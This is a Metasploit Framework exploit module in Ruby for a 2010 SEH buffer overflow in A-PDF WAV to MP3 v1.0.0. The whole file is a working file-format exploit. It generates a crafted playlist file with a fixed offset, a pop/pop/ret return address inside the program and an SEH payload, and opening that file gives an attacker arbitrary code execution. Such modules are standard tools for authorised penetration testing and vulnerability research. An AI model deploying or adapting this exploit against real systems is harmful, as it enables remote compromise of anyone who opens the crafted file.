# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;A-PDF WAV to MP3 v1.0.0 Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a buffer overflow in A-PDF WAV to MP3 v1.0.0. When
        the application is used to import a specially crafted m3u file, a buffer overflow occurs
        allowing arbitrary code execution.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;d4rk-h4ck3r&#039;, # Original Exploit
          &#039;Dr_IDE&#039;,      # SEH Exploit
          &#039;dookie&#039;       # MSF Module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;OSVDB&#039;, &#039;67241&#039; ],
          [ &#039;EDB&#039;, &#039;14676&#039; ],
          [ &#039;EDB&#039;, &#039;14681&#039; ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;seh&#039;,
          &#039;DisablePayloadHandler&#039; => &#039;true&#039;,
        },
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 600,
          &#039;BadChars&#039; => "\x00\x0a",
          &#039;StackAdjustment&#039; => -3500
        },
      &#039;Platform&#039; => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Windows Universal&#039;, { &#039;Ret&#039; => 0x0047265c, &#039;Offset&#039; => 4132 } ],  # p/p/r in wavtomp3.exe
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Aug 17 2010&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;FILENAME&#039;, [ false, &#039;The file name.&#039;, &#039;msf.wav&#039;]),
      ], self.class)

  end

  def exploit

    sploit = rand_text_alpha_upper(target[&#039;Offset&#039;])
    sploit << generate_seh_payload(target.ret)

    print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")

    file_create(sploit)

  end

end

